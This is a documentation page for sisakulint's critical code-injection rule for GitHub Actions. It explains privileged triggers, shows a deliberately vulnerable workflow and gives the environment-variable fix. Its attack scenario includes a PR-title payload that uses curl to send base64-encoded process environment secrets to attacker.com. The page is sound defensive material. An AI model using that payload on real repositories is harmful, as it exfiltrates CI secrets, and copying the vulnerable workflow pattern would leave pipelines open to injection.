---
title: "Code Injection Rule (Critical)"
weight: 12
---

### Code Injection Rule (Critical) Overview

This rule detects code injection vulnerabilities when untrusted input is used directly in shell scripts or JavaScript code within **privileged workflow contexts**. Privileged workflows have write permissions or access to secrets, making them high-value targets for attackers.

#### Key Features:

- **Privileged Context Detection**: Identifies dangerous patterns in `pull_request_target`, `workflow_run`, `issue_comment`, and other privileged triggers
- **Dual Script Detection**: Analyzes both `run:` scripts and `actions/github-script` for untrusted input
- **Auto-fix Support**: Automatically converts unsafe patterns to use environment variables

### Security Impact

**Severity: Critical (10/10)**

Code injection in privileged workflows represents the highest severity vulnerability:

1. **Arbitrary Code Execution**: Attackers can execute arbitrary commands
2. **Secret Exfiltration**: Access to repository secrets and GITHUB_TOKEN with write permissions
3. **Repository Compromise**: Ability to modify code, create releases, or manipulate repository settings
4. **Supply Chain Attack**: Compromised workflows can poison artifacts or deployments

### Privileged Workflow Triggers

- **`pull_request_target`**: Runs with write permissions and secrets, but triggered by untrusted PRs
- **`workflow_run`**: Executes with elevated privileges after another workflow completes
- **`issue_comment`**: Triggered by comments from any user, including external contributors
- **`issues`**: Triggered by issue events, potentially from untrusted sources

### Example Vulnerable Workflow

```yaml
name: Auto-label PRs

on:
  pull_request_target:  # PRIVILEGED
    types: [opened, edited]

jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      # CRITICAL VULNERABILITY
      - name: Add label based on title
        run: |
          TITLE="${{ github.event.pull_request.title }}"
          echo "Processing PR: $TITLE"
```

### Attack Scenario

Attacker creates a PR with a crafted title:
```
Title: "; curl https://attacker.com/$(cat /proc/self/environ | base64) #
```

The shell interprets the malicious title and secrets are exfiltrated.

### Example Output

```bash
$ sisakulint

.github/workflows/pr-label.yaml:12:20: code injection (critical): "github.event.pull_request.title" is potentially untrusted and used in a workflow with privileged triggers. [code-injection-critical]
```

### Auto-fix Support

**Before (Vulnerable):**
```yaml
- name: Process PR
  run: echo "Title: ${{ github.event.pull_request.title }}"
```

**After (Secure):**
```yaml
- name: Process PR
  run: echo "Title: $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

### Common Untrusted Inputs

- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.event.pull_request.head.ref`
- `github.event.issue.title`
- `github.event.comment.body`
- `github.head_ref`

### Best Practices

1. **Always Use Environment Variables for Untrusted Input**
2. **Avoid Privileged Triggers When Possible**
3. **Limit Permissions Explicitly**
4. **Validate Input Before Use**

### Related Rules

- **[code-injection-medium]({{< ref "codeinjectionmedium.md" >}})**: Detect same issues in normal triggers
- **[envvar-injection-critical]({{< ref "envvarinjectioncritical.md" >}})**: Specialized detection for $GITHUB_ENV writes

### See Also

- [CodeQL: Code Injection (Critical)](https://codeql.github.com/codeql-query-help/actions/actions-code-injection-critical/)
- [GitHub: Security Hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [OWASP: CICD-SEC-04 - PPE](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-04-Poisoned-Pipeline-Execution)

{{< popup_link2 href="https://codeql.github.com/codeql-query-help/actions/actions-code-injection-critical/" >}}

{{< popup_link2 href="https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions" >}}
